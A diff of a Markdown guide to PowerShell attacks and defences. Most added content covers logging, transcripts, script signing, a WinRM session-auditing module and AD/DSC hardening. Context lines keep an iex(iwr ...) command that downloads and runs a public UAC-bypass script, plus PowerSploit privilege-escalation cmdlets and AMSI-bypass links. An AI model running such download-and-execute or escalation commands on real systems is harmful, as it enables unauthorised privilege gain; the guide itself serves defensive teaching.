@@ -8,7 +8,7 @@ permalink: /en/powershell/
 sitemap: false
 ---
 
-## Hackers and PowerShell - Power(S)Hell
+## 1. Hackers and PowerShell - Power(S)Hell
 
 ### Basic Techniques
 
@@ -311,17 +311,18 @@ Invoke-ShellCode -Force -ProcessID $target.Id
 
 #### UAC Bypass
 
+[UACME](https://github.com/hfiref0x/UACME)
+
 ```powershell
 # No longer Works on Win10 :-(
 iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')
 Invoke-PsUACme -method mmc
 ```
 
-[UACME](https://github.com/hfiref0x/UACME)
-
 #### Privilege Escalation
 
-[PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
+- [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
+- [PrivescCheck GitHub](https://github.com/itm4n/PrivescCheck)
 
 ```powershell
 # Returns services with unquoted paths that also have a space in the name
@@ -342,8 +343,6 @@ Get-ModifiableRegistryAutoRun
 # Finds potential DLL hijacking opportunities for currently running processes
 Find-ProcessDLLHijack
 ```
-
-[PrivescCheck GitHub](https://github.com/itm4n/PrivescCheck)
 
 #### MITM Attack
 
@@ -383,7 +382,9 @@ Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recu
 
 > Note: These methods may be caught by AVs
 
-<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
+[AMSI Bypass Methods](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+
+## 2. Securing PowerShell
 
 ### Blocking PowerShell Script Execution
 #### PowerShell Execution Policy
@@ -396,9 +397,8 @@ Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://comm
 
 #### Constrained Language Mode
 
-[Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)
-
-[Device Guard User Mode Code Integrity (UMCI)](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/select-types-of-rules-to-create)
+- [Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)
+- [Device Guard User Mode Code Integrity (UMCI)](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/select-types-of-rules-to-create)
 
 
 ```powershell
@@ -411,26 +411,370 @@ $ExecutionContext.SessionState.LanguageMode = [System.Management.Automation.PSLa
 
 #### PowerShell JEA
 
-[Just Enough Administration](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview)
+- [Just Enough Administration](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview)
+- [JEA Toolkit Helper](https://learn.microsoft.com/en-us/archive/blogs/privatecloud/introducing-the-updated-jea-helper-tool)
 
-### Auditing PowerShell
+![JEA Toolkit Helper](https://msdntnarchive.blob.core.windows.net/media/TNBlogsFS/prod.evol.blogs.technet.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/00/85/24/metablogapi/image_thumb_42CAC3F9.png)
 
-#### Script Execution Logging
+### Auditing PowerShell Usage
 
+#### Transcript
 
-[Script Tracing and Logging](https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script)
+```powershell
+$transcript = Start-Transcript
 
-[PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[  
-<img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png) 
+Get-Process
+
+$transcript.Path
+notepad.exe $transcript.Path
+```
+
+#### Script Execution and Module Logging
+
+- [Script Tracing and Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
+- [Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibilityt)
+- [PowerShell ♥ the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
+
+![PowerShell 5 Logging](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png)
 
 
 #### PSReadline Command History
 
+```powershell
+(Get-PSReadLineOption).HistorySavePath
+notepad.exe (Get-PSReadLineOption).HistorySavePath
+```
+
+```powershell
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+Set-PSReadLineOption -HistorySaveStyle SaveIncrementally
+```
+
 #### Remoting Sessions
+
+- [WSMan Remote Shells](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/95abd276-2074-4c65-9a0c-88e58612b107)
+- [Get-WSManInstance Cmdlet](https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/get-wsmaninstance)
+
+```powershell
+#region Type Definitions
+enum ShellType
+{
+    Cmd
+    PowerShell
+    PowerShell32
+    PowerShellWorkflow
+    ServerManagerWorkflows
+    CustomShell
+    Other
+}
+
+class RemoteShellInfo
+{
+    [guid] $RemoteShellId
+    [string] $Name
+    [string] $ResourceUri
+    [string] $Owner
+    [string] $State
+    [ipaddress] $ClientIP
+    [cultureinfo] $Locale
+    [cultureinfo] $DataLocale
+    [string] $CompressionMode
+    [string] $InputStreams
+    [string] $OutputStreams
+    [bool] $ProfileLoaded
+    [string] $Encoding
+    [string] $BufferMode
+    [timespan] $ShellRunTime
+    [timespan] $ShellInactivity
+    [timespan] $IdleTimeOut
+    [timespan] $MaxIdleTimeOut
+    [int] $ProcessId
+    [int] $ChildProcesses
+    [string] $MemoryUsed
+    [string] $ComputerName
+
+    [ShellType] GetShellType()
+    {
+        # Default value:
+        [ShellType] $result = [ShellType]::Other
+
+        switch($this.ResourceUri)
+        {
+            'http://schemas.microsoft.com/powershell/Microsoft.PowerShell' { $result = [ShellType]::PowerShell }
+            'http://schemas.microsoft.com/powershell/microsoft.powershell32' { $result = [ShellType]::PowerShell32 }
+            'http://schemas.microsoft.com/powershell/microsoft.powershell.workflow' { $result = [ShellType]::PowerShellWorkflow }
+            'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd' { $result = [ShellType]::Cmd }
+            'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CustomShell' { $result = [ShellType]::CustomShell }
+            'http://schemas.microsoft.com/powershell/microsoft.windows.servermanagerworkflows' { $result = [ShellType]::ServerManagerWorkflows }
+        }
+        
+        return $result
+    }
+
+    [String] ToString()
+    {
+        return $this.Name
+    }
+}
+#endregion Type Definitions
+
+#region Constants
+[uint16] $DefaultHttpPort = 5985
+[uint16] $DefaultHttpsPort = 5986
+#endregion Constants
+
+#region Main Cmdlets
+function Get-ShellSession
+{
+    [OutputType([RemoteShellInfo])]
+    Param(
+        [Parameter(ValueFromPipeline = $true)]
+        [ValidateNotNull()]
+        [Alias('Computer', 'Server', 'cn', 's', 'c')]
+        [string[]] $ComputerName = @('localhost'),
+        
+        [Alias('UseTLS')]
+        [switch] $UseSSL,
+        
+        [ValidateNotNull()]
+        [Nullable[uint16]] $Port
+    )
+
+    Begin
+    {
+        if($null -eq $Port)
+        {
+            if($UseSSL.IsPresent)
+            {
+                $Port = $DefaultHttpsPort
+            }
+            else
+            {
+                $Port = $DefaultHttpPort
+            }
+        }
+    }
+
+    Process
+    {
+        try
+        {
+            foreach($computer in $ComputerName)
+            {
+                try
+                {
+                    Get-WSManInstance -ComputerName $computer -Port $Port -UseSSL:$UseSSL -ResourceURI shell -Enumerate -ErrorAction Stop | ForEach-Object {
+                        Write-Output -InputObject ([RemoteShellInfo]@{
+                            ComputerName = $computer
+                            RemoteShellId = $PSItem.ShellId
+                            Name = $PSItem.Name
+                            ResourceUri = $PSItem.ResourceUri
+                            Owner = $PSItem.Owner
+                            ClientIP = $PSItem.ClientIP
+                            Locale = $PSItem.Locale
+                            DataLocale = $PSItem.DataLocale
+                            CompressionMode = $PSItem.CompressionMode
+                            InputStreams = $PSItem.InputStreams
+                            OutputStreams = $PSItem.OutputStreams
+                            MaxIdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.MaxIdleTimeOut 
+                            IdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.IdleTimeOut 
+                            ProfileLoaded = $PSItem.ProfileLoaded -eq 'Yes'
+                            Encoding = $PSItem.Encoding
+                            BufferMode = $PSItem.BufferMode
+                            State = $PSItem.State
+                            ShellInactivity = ConvertFrom-XmlDuration -Duration $PSItem.ShellInactivity 
+                            ShellRunTime = ConvertFrom-XmlDuration -Duration $PSItem.ShellRunTime
+                            ProcessId = $PSItem.ProcessId
+                            ChildProcesses = $PSItem.ChildProcesses
+                            MemoryUsed = $PSItem.MemoryUsed
+                        })
+                    }
+                }
+                catch [System.Runtime.InteropServices.COMException]
+                {
+                    # Sample COMException message thrown by Get-WSManInstance:
+                    # The WinRM client cannot process the request because the server name cannot be resolved.
+
+                    # We can continue with another computer
+                    Write-Error -ErrorRecord $PSItem
+                }
+            }
+        }
+        catch
+        {
+            # An unknown error has occured, so terminate execution.
+            Write-Error -ErrorRecord $PSItem
+        }
+    }
+}
+
+function Remove-ShellSession
+{
+    [OutputType('None')]
+    [CmdletBinding(DefaultParameterSetName = 'ByShellId')]
+    Param(
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByShellId')]
+        [guid] $RemoteShellId,
+
+        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByShellId')]
+        [ValidateNotNullOrEmpty()]
+        [Alias('Computer', 'Server', 'cn', 's', 'c')]
+        [string] $ComputerName = 'localhost',
+        
+        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByInputObject')]
+        [RemoteShellInfo] $InputObject,
+        
+        [Alias('UseTLS')]
+        [switch] $UseSSL,
+        
+        [ValidateNotNull()]
+        [Nullable[uint16]] $Port
+    )
+
+    Begin
+    {
+        if($null -eq $Port)
+        {
+            if($UseSSL.IsPresent)
+            {
+                $Port = $DefaultHttpsPort
+            }
+            else
+            {
+                $Port = $DefaultHttpPort
+            }
+        }
+    }
+
+    Process
+    {
+        try {
+            switch($PSCmdlet.ParameterSetName)
+            {
+                'ByShellId' {
+                    Remove-WSManInstance -ComputerName $ComputerName -UseSSL:$UseSSL -Port $Port -ResourceURI shell -SelectorSet @{ ShellID = $RemoteShellId } -ErrorAction Stop
+                }
+    
+                'ByInputObject' {
+                    Remove-WSManInstance -ComputerName $InputObject.ComputerName -UseSSL:$UseSSL -Port $Port -ResourceURI shell -SelectorSet @{ ShellID = $InputObject.RemoteShellId } -ErrorAction Stop
+                }
+            }
+        }
+        catch {
+            Write-Error -ErrorRecord $PSItem
+        }
+    }
+}
+#endregion Cmdlets
+
+#region Helper Functions
+<#
+.SYNOPSIS
+Converts a string to a TimeSpan equivalent.
+.PARAMETER Duration
+The string to convert. The string format must conform to the W3C XML Schema Part 2: Datatypes recommendation for duration.
+.EXAMPLE
+ConvertFrom-XmlDuration -Duration 'P0DT0H2M58S'
+Days              : 0
+Hours             : 0
+Minutes           : 2
+Seconds           : 58
+Milliseconds      : 0
+Ticks             : 1780000000
+TotalDays         : 0.00206018518518519
+TotalHours        : 0.0494444444444444
+TotalMinutes      : 2.96666666666667
+TotalSeconds      : 178
+TotalMilliseconds : 178000
+#>
+function ConvertFrom-XmlDuration
+{
+    [CmdletBinding()]
+    [OutputType([TimeSpan])]
+    Param(
+        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+        [string] $Duration
+    )
+    
+    Process
+    {
+        try
+        {
+            if([string]::IsNullOrEmpty($Duration))
+            {
+                return [timespan]::Zero
+            }
+            else
+            {
+                return [System.Xml.XmlConvert]::ToTimeSpan($Duration)    
+            }
+        }
+        catch [System.FormatException]
+        {
+            Write-Error -ErrorRecord $PSItem
+        }
+    }
+}
+#endregion Helper Functions
+```
 
 #### Microsoft Defender for Endpoint
 
-## Active Directory Security Assessment
+![](../assets/images/powershell_atp1.png)
+
+![](../assets/images/powershell_atp2.png)
+
+### Script Signing
+
+```powershell
+$cer = Get-ChildItem -Path Cert:\CurrentUser\My -CodeSigningCert |
+    Sort-Object -Property NotAfter |
+    Select-Object -First 1
+
+Get-ChildItem -Path .\ScriptsToSign -File -Include @('*.ps1','*.psd1','*.psm1') -Recurse |
+    Get-AuthenticodeSignature |
+    Where-Object Status -ne Valid |
+    Select-Object -ExpandProperty Path |
+    Set-AuthenticodeSignature -Certificate $cer -TimestampServer http://timestamp.digicert.com -HashAlgorithm SHA256 -IncludeChain signer
+
+Get-AuthenticodeSignature -FilePath script.ps1
+```
+
+### Unattended Scripts
+
+#### Scheduled Tasks
+
+#### Managed Service Accounts
+
+#### Script Credentials
+
+#### Azure AD Credentials
+
+
+## 3. Active Directory Security Assessment
+
+### PowerShell-Based Assessment Tools
+
+#### Purple Knight
+
+[Purple Knight Web](https://www.purple-knight.com/)
+[Security Indicators](https://www.purple-knight.com/security-indicators/)
+
+![](https://www.purple-knight.com/wp-content/uploads/images_screenshots/image-pk-home-step01find-768x614.png)
+
+#### AD ACL Scanner
+
+[AD ACL Scanner GitHub](https://github.com/canix1/ADACLScanner)
+
+![](https://github.com/canix1/ADACLScanner/raw/master/src/ADACLScan7.0_Permission.png)
+
+![](https://github.com/canix1/ADACLScanner/raw/master/src/ADACLScan6.0.png)
+
+![](https://github.com/canix1/ADACLScanner/raw/master/src/effectiverights.gif)
+
+#### PowerView
+- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+- [PowerView Intro](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview)
 
 ### Operating System Versions
 
@@ -445,20 +789,45 @@ $ExecutionContext.SessionState.LanguageMode = [System.Management.Automation.PSLa
 ### Event Logs
 
 
-## Desired State Configuration
+### Desired State Configuration (DSC)
 
-### Domain Controller Security Baselines
+#### DSC Intro
 
+- [NetworkingDsc](https://www.powershellgallery.com/packages/NetworkingDsc)
+- [LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
 
-### CIS Checklists
-## Pester
+```powershell
+Service Spooler
+{
+        Name = "Spooler"
+        State = "Stopped"
+}
 
-## Unattended Scripts
+Package LAPS
+{
+            Name  = 'Local Administrator Password Solution'
+            Path = 'https://download.microsoft.com/download/C/7/A/C7AAD914-A8A6-4904-88A1-29E657445D03/LAPS.x64.msi'
+            ProductId = 'EA8CB806-C109-4700-96B4-F1F268E5036C'
+}
+```
 
-### Scheduled Tasks
+#### Security Baseline Tooling
+- [SecurityPolicyDsc](https://www.powershellgallery.com/packages/SecurityPolicyDsc/)
+- [AuditPolicyDsc](https://www.powershellgallery.com/packages/AuditPolicyDsc)
+- [BaselineManagement](https://www.powershellgallery.com/packages/BaselineManagement)
+- [Microsoft Security Compliance Manager 4.0](https://www.microsoft.com/en-us/download/details.aspx?id=53353)
+- [Microsoft Security Compliance Toolkit 1.0 ](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
+- [Quickstart: Convert Group Policy into DSC](https://learn.microsoft.com/en-us/powershell/dsc/quickstarts/gpo-quickstart)
 
-### Managed Service Accounts
+#### Center for Internet Security (CIS) Benchmarks
+- [CIS Benchmarks](https://www.cisecurity.org/benchmark/microsoft_windows_server)
+- [CIS DSC](https://github.com/techservicesillinois/SecOps-Powershell-CISDSC)
 
-### Script Credentials
+#### Security Technical Implementation Guides (STIGs)
 
-### Azure AD Credentials
+- [STIGs](https://public.cyber.mil/stigs/)
+- [Windows Server 2019 STIG](https://www.stigviewer.com/stig/windows_server_2019/)
+- [PowerSTIG](https://github.com/microsoft/PowerStig)
+
+### Pester
+
